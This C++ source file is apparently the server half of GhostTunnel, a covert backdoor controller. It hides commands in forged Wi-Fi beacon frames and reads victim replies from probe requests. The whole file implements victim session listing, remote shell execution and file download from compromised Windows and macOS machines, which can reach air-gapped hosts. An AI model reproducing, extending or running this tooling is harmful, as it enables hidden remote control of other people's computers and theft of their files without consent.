/*
 *  Copyright (C) 2018 E7mer of PegasusTeam <haimohk@gmail.com>
 *
 *  This file is a part of GhostTunnel
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
*/

#include <stdarg.h>
#include<iconv.h>
#include <sys/stat.h>
#include "gt_server.h"


char *ptver = 
"  ____    __   ___  _____                            _______                   \n" \
" |___ \\  / /  / _ \\|  __ \\                          |__   __|                  \n" \
"   __) |/ /_ | | | | |__) |__  __ _  __ _ ___ _   _ ___| | ___  __ _ _ __ ___  \n" \
"  |__ <| '_ \\| | | |  ___/ _ \\/ _` |/ _` / __| | | / __| |/ _ \\/ _` | '_ ` _ \\ \n" \
"  ___) | (_) | |_| | |  |  __/ (_| | (_| \\__ \\ |_| \\__ \\ |  __/ (_| | | | | | |\n" \
" |____/ \\___/ \\___/|_|   \\___|\\__, |\\__,_|___/\\__,_|___/_|\\___|\\__,_|_| |_| |_|\n" \
"                               __/ |                                           \n" \
"                              |___/                                            \n";


struct gt_command {
	const char *cmd;
	int (*handler)(void *param, int argc, char *argv[]);
	char ** (*completion)(const char *str, int pos);
	const char *usage;
};


static const struct gt_command ghost_tunnel_commands[] = {
	{ "sessions", &gt_server::cmd_list, NULL, "= list all clients" },
	{ "use", &gt_server::cmd_use, NULL, "= select a client to operate, use [clientID]" },
	{ "exit", &gt_server::cmd_exit, NULL, "= exit current operation" },
	{ "wget", &gt_server::cmd_wget, NULL, "= download a file from a client, wget [filepath]" },
	{ "quit", &gt_server::cmd_quit, NULL, "= quit ghost tunnel" },
	{ "help", &gt_server::cmd_help, /*ghost_tunnel_complete_help*/NULL, "= show this usage help" },
	{ NULL, NULL, NULL, NULL }
};


char logbuf[1024];
int gt_log(const char *format, ...)
{
	int n;
	va_list ap;
	
	va_start(ap, format);
	n=vsnprintf (logbuf, 1024, format, ap);
	va_end(ap);

	printf("%s\n", logbuf);
	edit_print_ps();

	return n;
}


gt_server::gt_server()
{
	running = false;
	srand(time(NULL));
	server_id = random() % 256;
	cur_client_id = 1;
	sequence_number = 0;
	cur_op_client = NULL;
	fp = NULL;

	pthread_mutex_init(&send_queue_mutex, NULL);
}

gt_server::~gt_server()
{
	if(running){
		running = false;
		gt_cnsl.destroy();
		//osdep_stop();
	}

	pthread_mutex_destroy(&send_queue_mutex);

}


bool gt_server::initlize(const char *rinterface, const char *winterface)
{
	char szerr[1024] = {0};
	int mode = 0;
	int ret = -1;
	
	riface = rinterface;
	wiface = winterface;

	if(riface == wiface)
	{
		ret = kismet_get_mode(rinterface, szerr, &mode);
		if(ret != 0){
			printf("ERROR: interface %s is not available.\n", rinterface);
			return false;
		}

		kismet_interface_down(rinterface, szerr);
		kismet_set_mode(rinterface, szerr, 6);
		kismet_set_channel(rinterface, 1, szerr);
		kismet_interface_up(rinterface, szerr);
	}
	else
	{
		ret = kismet_get_mode(rinterface, szerr, &mode);
		if(ret != 0){
			printf("ERROR: interface %s is not available.\n", rinterface);
			return false;
		}

		ret = kismet_get_mode(winterface, szerr, &mode);
		if(ret != 0){
			printf("ERROR: interface %s is not available.\n", winterface);
			return false;
		}

		kismet_interface_down(rinterface, szerr);
		kismet_set_mode(rinterface, szerr, 6);
		kismet_set_channel(rinterface, 1, szerr);
		kismet_interface_up(rinterface, szerr);

		kismet_interface_down(winterface, szerr);
		kismet_set_mode(winterface, szerr, 6);
		kismet_set_channel(winterface, 1, szerr);
		kismet_interface_up(winterface, szerr);
	}

	return true;

}

int gt_server::start()
{
	pthread_t tid;
	int ret;

	ret = osdep_start(const_cast<char*>(riface.c_str()), const_cast<char*>(wiface.c_str()));
	if(ret == 0)
	{
		running = true;
		ret = pthread_create(&tid, NULL, receive_thread, this);
		if(ret != 0)
		{
			osdep_stop();
			return -1;
		}

		ret = pthread_create(&tid, NULL, send_thread, this);
		ret = pthread_create(&tid, NULL, handle_conn_thread, this);

		printf("%s", ptver);
		gt_cnsl.initlize(edit_cmd_command_cb, edit_eof_cb, edit_completion_cb, this, 0, "ghost_tunnel");
	}

	return 0;
}

int gt_server::send(unsigned char client_id, TUNNEL_DATA_TYPE data_type, unsigned char *data, unsigned int len)
{
	unsigned char send_buf[300];
	unsigned char *ssid = send_buf;
	unsigned char ssid_length = 0;
	unsigned char *vendor = NULL;
	unsigned char vendor_length = 0;
	tunnel_data_header tdh = {0};
	unsigned short total_length = sizeof(tunnel_data_header) + len;

	client_session *cs;
	if(!client_session_query(client_id, &cs))
		return -1;

	tdh.flag = 0xFE;
	tdh.data_type = data_type;
	tdh.seq = cs->send_seq++;                  /// TODO
	tdh.client_id = client_id;
	tdh.server_id = server_id;

	if(total_length > 32)
	{
		tdh.data_type |= DATA_IN_VENDOR;
		tdh.length = 32 - sizeof(tunnel_data_header);
		vendor = send_buf + 32;
		vendor_length = total_length - 32;
		ssid_length = 32;
	}
	else
	{
		tdh.length = len;
		ssid_length = total_length;
	}

	memset(send_buf, 0, sizeof(send_buf));
	memcpy(send_buf, &tdh, sizeof(tunnel_data_header));
	memcpy(send_buf + sizeof(tunnel_data_header), data, len);


	send_pkt sp;
	sp.client_id = client_id;
	sp.seq = tdh.seq;
	sp.pkt = create_tunnel_beacon_packet(ssid, ssid_length, vendor, vendor_length);

	pthread_mutex_lock(&send_queue_mutex);
	send_queue.push(sp);
	pthread_mutex_unlock(&send_queue_mutex);

	return 0;
}

struct packet gt_server::create_tunnel_beacon_packet(unsigned char *ssid, unsigned char ssid_len, unsigned char *vendor, unsigned char vendor_len)
{
  struct packet beacon;
  struct beacon_fixed *bf;
  static uint64_t internal_timestamp = 0;
  struct ether_addr bc;

  struct ether_addr bssid = /*{{0xd0,0xfa,0x1d,0x20,0x08,0xa6}};//*/generate_mac(MAC_KIND_AP);

  MAC_SET_BCAST(bc);
  create_ieee_hdr(&beacon, IEEE80211_TYPE_BEACON, 'a', 0, bc, bssid, bssid, SE_NULLMAC, 0);

  bf = (struct beacon_fixed *) (beacon.data + beacon.len);

  internal_timestamp += 0x400 * DEFAULT_BEACON_INTERVAL;
  bf->timestamp = htole64(internal_timestamp);
  bf->interval = htole16(DEFAULT_BEACON_INTERVAL);
  bf->capabilities = 0x0000;
  bf->capabilities |= 0x0010;

  beacon.len += sizeof(struct beacon_fixed);

  // SSID
  beacon.data[beacon.len] = 0x00;	//SSID parameter set
  beacon.data[beacon.len+1] = ssid_len;	//SSID len
  memcpy(beacon.data + beacon.len + 2, ssid, ssid_len);	//Copy the SSID
  beacon.len += ssid_len + 2;

  // supported rates
  memcpy(beacon.data + beacon.len, DEFAULT_11B_RATES, 6);	//11 MBit
  beacon.len += 6;

  // channel
  memcpy(beacon.data + beacon.len, DEFAULT_CHANNEL, 3);
  beacon.len += 3;

  // tim
  memcpy(beacon.data + beacon.len, DEFAULT_TIM, 6);
  beacon.len += 6;

  // erp
  memcpy(beacon.data + beacon.len, DEFAULT_ERP, 3);
  beacon.len += 3;


  // extended rates
  memcpy(beacon.data + beacon.len, DEFAULT_11G_RATES, 10);	//54 MBit
  beacon.len += 10;

  // wpa
  memcpy(beacon.data + beacon.len, DEFAULT_WPA_AES_TAG, 26);
  beacon.len += 26;

  // default vendor 
  memcpy(beacon.data + beacon.len, DEFAULT_VENDOR, 26);
  beacon.len += 26;


  // vendor
  if(vendor)
  {
  	  beacon.data[beacon.len] = 0xDD;
	  beacon.data[beacon.len+1] = vendor_len;
	  memcpy(beacon.data + beacon.len + 2, vendor, vendor_len); 
	  beacon.len += vendor_len + 2;
  }


  return beacon;
}

void* gt_server::handle_conn_thread(void *param)
{
	gt_server *pgts = (gt_server*)param;
	client_manager_map::iterator it;
	int times=0;
	int times1=0;

	while(pgts->running)
	{
		for(it=pgts->client_session_mgr.begin(); it!=pgts->client_session_mgr.end();it++)
		{
			pgts->send(it->second.id, TUNNEL_CON_HEARTBEAT, NULL, 0);
		}

		sleep(30);

	}
}

void* gt_server::send_thread(void *param)
{
	gt_server *pgts = (gt_server*)param;
	send_pkt sp;
	int times;

	while(pgts->running)
	{
		if(!pgts->send_queue.empty())
		{
			pthread_mutex_lock(&pgts->send_queue_mutex);
			sp = pgts->send_queue.front();
			pthread_mutex_unlock(&pgts->send_queue_mutex);

			times = 2000;
			while(times)
			{
				osdep_send_packet(&sp.pkt);
				usleep(100);	
				times--;			
			}
			
			pthread_mutex_lock(&pgts->send_queue_mutex);
			pgts->send_queue.pop();
			pthread_mutex_unlock(&pgts->send_queue_mutex);

		}

		usleep(100);
	}

}

void* gt_server::receive_thread(void *param)
{
	gt_server *pgts = (gt_server*)param;
	struct packet pkt;
	struct ieee_hdr *hdr;
	unsigned char gt_data[1024];
	int gt_data_len = 0;


	while(pgts->running)
	{
		pkt = osdep_read_packet();
		if (pkt.len == 0){
			continue;
		}

		hdr = (struct ieee_hdr *) pkt.data;
		if (hdr->type == IEEE80211_TYPE_PROBEREQ )
		{
			gt_data_len = 1024;
			if(0 == pgts->parse_data_from_probe_request(&pkt, gt_data, &gt_data_len))
				pgts->handle_data(&pkt, gt_data, gt_data_len);
		}
	}

}

int gt_server::parse_data_from_probe_request(struct packet *pkt, unsigned char *data, int *len)
{
	struct ieee_hdr *hdr = (struct ieee_hdr *) (pkt->data);
	unsigned char *tags = pkt->data + sizeof(struct ieee_hdr);
	tunnel_data_header *tdh;
	unsigned char ssid[32] = {0};
	int left = pkt->len - sizeof(struct ieee_hdr);

	if(hdr->type != IEEE80211_TYPE_PROBEREQ || tags[0] != 0 || tags[1] > 32)   // probe request, ssid, length
		return -1;

	memcpy(ssid, tags+2, tags[1]);
	tdh = (tunnel_data_header*)ssid;
	if(tdh->flag != 0xFE)  // not ghost tunnel data
	{
		return -1;
	}

	if(tdh->data_type & DATA_IN_VENDOR)
	{
		tdh->data_type &= ~DATA_IN_VENDOR;

		left = left -2 - tags[1];
		while(left > 0)
		{
			tags = tags + 2 + tags[1];
			left = left - 2 - tags[1]; 
		}

		if(tags[0] != 221)
			return -1;

		tdh->length += tags[1];     // total data length
		memcpy(data, ssid, 32);
		memcpy(data+32, tags+2, tags[1]);

		*len = 32 + tags[1];

	}
	else
	{
		memcpy(data, ssid, sizeof(tunnel_data_header) + tdh->length);
		*len = sizeof(tunnel_data_header) + tdh->length;
	}

	return 0;
}

void gt_server::handle_data(struct packet *pkt, unsigned char *data, int len)
{
	tunnel_data_header *tdh = (tunnel_data_header*)data;

	if(data == NULL || len < sizeof(tunnel_data_header))
		return;

	switch(tdh->data_type & 0xF0)
	{
	case TUNNEL_SHELL:
		handle_shell(pkt, data, len);
		break;
	case TUNNEL_CON:
		handle_connect(pkt, data, len);
		break;
	case TUNNEL_FILE:
		handle_file(pkt, data, len);
		break;
	default:
		break;
	}

}

void gt_server::handle_connect(struct packet *pkt, unsigned char *data, int len)
{
	tunnel_data_header *tdh = (tunnel_data_header*)data;
	struct ether_addr *src_mac = get_source(pkt);

	switch(tdh->data_type)
	{
	case TUNNEL_CON_CLIENT_REQ:
	{
		if(!client_session_exist(src_mac))
		{
			unsigned char client_id = cur_client_id++;
			tunnel_online_info *toi = (tunnel_online_info *)(data + sizeof(tunnel_data_header));
			client_session cs ={0};
			cs.id = client_id;
			cs.seq = tdh->seq;
			cs.send_seq = 1;
			cs.os_version = toi->os;
			memcpy(cs.device_name, toi->device_name, tdh->length-1); 
			cs.mac_addr = *src_mac;
			cs.is_connected = true;

			client_session_insert(&cs);
			send(client_id, TUNNEL_CON_SERVER_RES, data + sizeof(tunnel_data_header), tdh->length);

			gt_log("\nINFO: client %s online.\n", cs.device_name);

		}
		else
		{
			client_session *cs;
			if(client_session_query(src_mac, &cs))
			{
				send(cs->id, TUNNEL_CON_SERVER_RES, data + sizeof(tunnel_data_header), tdh->length);
			}
		}
	}
	break;
	case TUNNEL_CON_HEARTBEAT:
	{
		client_session *cs;
		if(client_session_query(tdh->client_id, &cs))
		{
			if(tdh->seq >= cs->seq + 1)
			{
				cs->is_connected = true;
				cs->seq = tdh->seq;
			}
		}

	}
	break;
	default:
	break;

	}

}

int gt_server::to_utf8(char *src, size_t *src_len, char *dest, size_t *dest_len)
{
	iconv_t cd = iconv_open("UTF8", acp_name);
	if(cd==(iconv_t)-1)
	{
		printf("ERROR:open iconv %s\n",strerror(errno));
		return -1;
	}
	size_t rc= iconv(cd, &src, src_len, &dest, dest_len);
	if(rc==(size_t)-1)
	{
		printf("ERROR: iconv %s\n",strerror(errno));
		iconv_close(cd);
		return -1;
	}

	iconv_close(cd);

	return 0;
}

void gt_server::handle_shell(struct packet *pkt, unsigned char *data, int len)
{
	tunnel_data_header *tdh = (tunnel_data_header*)data;
	char cmdstr[512];
	char cmdstr_utf8[1024];
	size_t len1;
	size_t len2;

	if(!cur_op_client || cur_op_client->id != tdh->client_id || server_id != tdh->server_id)
		return;

	if( tdh->seq < cur_op_client->seq + 1)
		return;

	cur_op_client->seq = tdh->seq;

	switch(tdh->data_type)
	{
	case TUNNEL_SHELL_DATA:
		memset(cmdstr, 0 , sizeof(cmdstr));
		memset(cmdstr_utf8, 0, sizeof(cmdstr_utf8));
		len1 = len - sizeof(tunnel_data_header);
		len2 = sizeof(cmdstr_utf8);
		memcpy(cmdstr, data + sizeof(tunnel_data_header), len1);
		to_utf8(cmdstr, &len1, cmdstr_utf8, &len2);
		printf("%s", cmdstr_utf8);
		edit_print_redraw();
	break;
	case TUNNEL_SHELL_ACP:
		memcpy(&shell_acp, data + sizeof(tunnel_data_header), sizeof(shell_acp));
		sprintf(acp_name, "CP%d", shell_acp);
		//printf("ACP: %d\n", shell_acp);
	break;
	default:
	break;
	}

}

int gt_server::download_progress(int rate)
{
    static char bar[102];
    int i=0;
    memset(bar,'\0',sizeof(bar));
    const char* flag = "|/-\\";

    for(i=0; i<rate;i++)
		bar[i] = '=';

    printf("[%-101s][%d][%c]\r",bar,rate,flag[rate%4]);
    fflush(stdout);

    if(rate==100)
    	printf("\n");
}

void gt_server::handle_file(struct packet *pkt, unsigned char *data, int len)
{
	tunnel_data_header *tdh = (tunnel_data_header*)data;
	char file_path[256] = {0};

	if(!cur_op_client || cur_op_client->id != tdh->client_id || server_id != tdh->server_id)
		return;

	if( tdh->seq < cur_op_client->seq + 1)
		return;

	cur_op_client->seq = tdh->seq;

	switch(tdh->data_type)
	{
	case TUNNEL_FILE_DATA:
	{
		fwrite(data + sizeof(tunnel_data_header), len - sizeof(tunnel_data_header), 1, fp);

		cur_size += (len - sizeof(tunnel_data_header));
		//printf("download: %d%\n", cur_size * 100 / file_size);
		download_progress(cur_size * 100 / file_size);

	}
	break;
	case TUNNEL_FILE_INFO:
	{
		memcpy(&file_size, data + sizeof(tunnel_data_header), sizeof(file_size));
		cur_size = 0;
		//printf("file size: %d\n", file_size);
		mkdir("downloads", S_IRUSR | S_IWUSR | S_IXUSR);

		if(fp){
			fclose(fp);
		}

		snprintf(file_path, sizeof(file_path), "./downloads/%s", file_name);
		fp = fopen(file_path, "ab");

	}
	break;
	case TUNNEL_FILE_END:
	{
		if(fp){
			fclose(fp);
		}
		edit_print_ps();
	}
	break;
	case TUNNEL_FILE_ERROR:
	{
		gt_log("ERROR: download file failed.");
	}
	break;
	default:
	break;
	}

}

void gt_server::client_session_insert(client_session *cs)
{
	client_session_mgr.insert(client_manager_map::value_type(cs->id, *cs));
}

void gt_server::client_session_delete(unsigned char client_id)
{
	client_session_mgr.erase(client_id);
}

bool gt_server::client_session_query(unsigned char client_id, client_session **cs)
{
	client_manager_map::iterator it;

	it = client_session_mgr.find(client_id);
	if(it != client_session_mgr.end())
	{
		*cs = &it->second;
		return true;
	}

	return false;
}

bool gt_server::client_session_query(struct ether_addr *mac, client_session **cs)
{
	client_manager_map::iterator it;

	for(it = client_session_mgr.begin(); it != client_session_mgr.end(); it++)
	{
		if(MAC_MATCHES(*mac, it->second.mac_addr))
		{
			*cs = &it->second;
			return true;
		}
	}

	return false;	
}

bool gt_server::client_session_exist(struct ether_addr *mac)
{
	client_manager_map::iterator it;

	for(it = client_session_mgr.begin(); it != client_session_mgr.end(); it++)
	{
		if(MAC_MATCHES(*mac, it->second.mac_addr))
		{
			return true;
		}
	}

	return false;
}


int gt_server::cmd_list(void *param, int argc, char *argv[])
{
	gt_server *gts = (gt_server*)param;
	client_manager_map::iterator it;
	char *os_name;

	printf("\n===========================================================================\n");
	printf("id\t\tmac\t\t\t\tdevice name\t\tos\n");
	for(it = gts->client_session_mgr.begin(); it != gts->client_session_mgr.end(); it++)
	{

		if (it->second.os_version == WIN_XP)
			os_name = "winxp";
		else if (it->second.os_version == WIN_VISTA)
			os_name = "Vista";
		else if (it->second.os_version == WIN_7)
			os_name = "Windows7";
		else if (it->second.os_version == WIN_8)
			os_name = "Windows8";
		else if (it->second.os_version == WIN_81)
			os_name = "Windows8.1";
		else if (it->second.os_version == WIN_10)
			os_name = "Windows10";
		else if (it->second.os_version == MAC_OSX)
			os_name = "OSX";
		else
			os_name = "UnKnown";

		printf("%d\t\t%02x:%02x:%02x:%02x:%02x:%02x\t\t%s\t\t%s\n", it->second.id, 
			it->second.mac_addr.ether_addr_octet[0],it->second.mac_addr.ether_addr_octet[1],it->second.mac_addr.ether_addr_octet[2],
			it->second.mac_addr.ether_addr_octet[3],it->second.mac_addr.ether_addr_octet[4],it->second.mac_addr.ether_addr_octet[5],
			it->second.device_name,
			os_name);
	}

	edit_print_ps();

	return 0;
}

int gt_server::cmd_use(void *param, int argc, char *argv[])
{
	gt_server *gts = (gt_server*)param;
	unsigned char client_id;
	char ps[256] = {0};
	client_manager_map::iterator it;

	client_id = atoi(argv[0]);

	if(!gts->client_session_query(client_id, &gts->cur_op_client))
	{
		gt_log("INFO: client [%d] not exist.", client_id);
		return -1;
	}

	sprintf(ps, "%s>", gts->cur_op_client->device_name);

	gts->send(gts->cur_op_client->id, TUNNEL_SHELL_INIT, NULL, 0);

	gts->gt_cnsl.set_prompt(ps);

	edit_print_ps();
	printf("\n");

	return 0;
}

int gt_server::cmd_exit(void *param, int argc, char *argv[])
{
	gt_server *gts = (gt_server*)param;

	if(gts->cur_op_client)
	{
		gts->send(gts->cur_op_client->id, TUNNEL_SHELL_QUIT, NULL, 0);	
		gts->gt_cnsl.set_prompt("");

		edit_print_ps();
		gts->cur_op_client = NULL;
	}
	else
	{
		edit_print_ps();
	}

	return 0;
}

int gt_server::cmd_wget(void *param, int argc, char *argv[])
{
	gt_server *gts = (gt_server*)param;
	char *p;

	if(gts->cur_op_client==NULL)
	{
		gt_log("Please select a client to operate.");
		return -1;
	}

	// TODO
	if(argc != 1){
		gt_log("You can only download one file at a time.");
		return -1;
	}

	p =  strrchr(argv[0], '\\');
	if(p)
	{
		p++;
		snprintf(gts->file_name, sizeof(gts->file_name), "%d_%s", time(NULL), p);		
	}
	else
	{
		snprintf(gts->file_name, sizeof(gts->file_name), "%d_%s", time(NULL), argv[0]);
	}

	gts->send(gts->cur_op_client->id, TUNNEL_FILE_GET, (unsigned char *)argv[0], strlen(argv[0]));	


	printf("\n");


	return 0;
}

int gt_server::cmd_quit(void *param, int argc, char *argv[])
{
	gt_server* gts = (gt_server*)param;
	printf("\n");
	if(gts->cur_op_client)
	{
		gts->send(gts->cur_op_client->id, TUNNEL_SHELL_QUIT, NULL, 0);
	}

	while(!gts->send_queue.empty())
	{
		usleep(1);
	}

	gts->~gt_server();

	exit(0);

	return 0;
}

int gt_server::cmd_help(void *param, int argc, char *argv[])
{
	const struct gt_command *cmd = ghost_tunnel_commands;
	
	printf("\n\nCOMMANDS:\n\n");
	while (cmd->cmd) {

		printf("\t%s %s\n", cmd->cmd, cmd->usage);
		cmd++;	

	}

	edit_print_ps();
	return 0;
}

void gt_server::print_help()
{
	const struct gt_command *cmd = ghost_tunnel_commands;
	
	printf("\nCOMMANDS:\n");
	while (cmd->cmd) {

		printf("\t%s %s\n", cmd->cmd, cmd->usage);
		cmd++;	

	}
}

int gt_server::cmd_command(char *cmd)
{
	if(cur_op_client)
	{
		printf("\n");
		send(cur_op_client->id, TUNNEL_SHELL_DATA, (unsigned char*)cmd, strlen(cmd));
	}

	return 0;
}

void gt_server::edit_cmd_command_cb(void *ctx, char *cmd_str)
{
	gt_server *pgts = (gt_server*)ctx;
	const struct gt_command *cmd, *match = NULL;
	int count;
	char *argv[max_args];
	int argc;
	char szcmd[512] = {0};

	strncpy(szcmd, cmd_str, sizeof(szcmd));
	argc = tokenize_cmd(cmd_str, argv);
	
	count = 0;
	cmd = ghost_tunnel_commands;
	while (cmd->cmd) {
		if (strncasecmp(cmd->cmd, argv[0], strlen(argv[0])) == 0) {
			match = cmd;
			if (os_strcasecmp(cmd->cmd, argv[0]) == 0) {
				/* we have an exact match */
				count = 1;
				break;
			}
			count++;
		}
		cmd++;
	}

	if (count > 1) {
		printf("Ambiguous command '%s'; possible commands:", argv[0]);
		cmd = ghost_tunnel_commands;
		while (cmd->cmd) {
			if (strncasecmp(cmd->cmd, argv[0], strlen(argv[0])) == 0) {
				printf(" %s", cmd->cmd);
			}
			cmd++;
		}
		printf("\n");
	}
	else if (count == 0) {

		if(pgts->cur_op_client)
		{
			pgts->cmd_command(szcmd);
		}
		else
		{
			printf("\nUnknown command '%s'\n", argv[0]);
			edit_print_ps();
		}

	}
	else {
		match->handler(ctx, argc - 1, &argv[1]);
	}
}

void gt_server::edit_eof_cb(void *ctx)
{
	eloop_terminate();
}

char ** gt_server::edit_completion_cb(void *ctx, const char *str, int pos)
{
	return 0;
}













